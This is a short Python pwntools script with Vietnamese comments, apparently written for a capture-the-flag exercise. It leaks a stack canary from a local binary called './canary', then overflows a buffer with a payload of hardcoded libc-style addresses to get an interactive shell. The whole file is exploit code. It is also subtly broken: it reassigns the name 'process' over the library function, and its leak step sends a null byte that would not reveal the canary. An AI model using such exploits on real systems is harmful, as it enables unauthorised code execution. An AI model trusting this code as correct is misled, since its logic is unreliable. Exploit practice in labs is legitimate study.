#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
import time
import struct

# Thay đổi địa chỉ canary và shellcode cho phù hợp với chương trình cụ thể
CANARY_OFFSET = 12
SHELLCODE = b"AAAA"+b"\xb0\x0d\xe5\xf7" + b"\xe0\x49\xe4\xf7" + b"\x2b\x5b\xe1\xf7"

def leak_canary():
    # Tạo và gửi dữ liệu lộ canary
    process = process('./canary')
    process.sendline(b"A" * CANARY_OFFSET + b"\x00")  # Gửi dữ liệu để lộ canary
    process.recvuntil(b"AAAA")
    
    # Đọc giá trị canary từ đầu ra của chương trình
    canary = process.recv(4)  # Đọc giá trị canary (4 bytes)
    process.close()
    
    return canary

def exploit(canary):
    # Tạo payload để ghi đè canary và chèn shellcode
    payload = b"A" * CANARY_OFFSET  # Buffer
    payload += canary  # Giá trị canary lộ
    payload += b"B" * 4  # Padding nếu cần
    payload += SHELLCODE  # Shellcode hoặc địa chỉ của shellcode

    # Thực thi chương trình với payload
    process = process('./canary')
    process.sendline(payload)
    process.interactive()

if __name__ == "__main__":
    canary_value = leak_canary()
    exploit(canary_value)
